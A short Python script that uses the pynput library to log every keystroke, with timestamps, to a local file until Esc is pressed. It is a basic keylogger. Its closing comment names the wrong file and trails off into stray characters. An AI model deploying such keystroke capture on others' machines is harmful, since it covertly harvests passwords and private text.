import logging
from pynput.keyboard import Listener , Key

logging.basicConfig(filename="key_log.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")

def on_press(key):
    logging.info(f"{key}")
    if key == Key.esc:
        print("Stopping... the keyboard listener.")
        return False

with Listener(on_press=on_press) as listener:
    listener.join()
# This code sets up a keyboard listener that logs the key pressed to a file named "log.txt".
# The log file will contain timestamps and the key pressed.dcdcdvs #vevv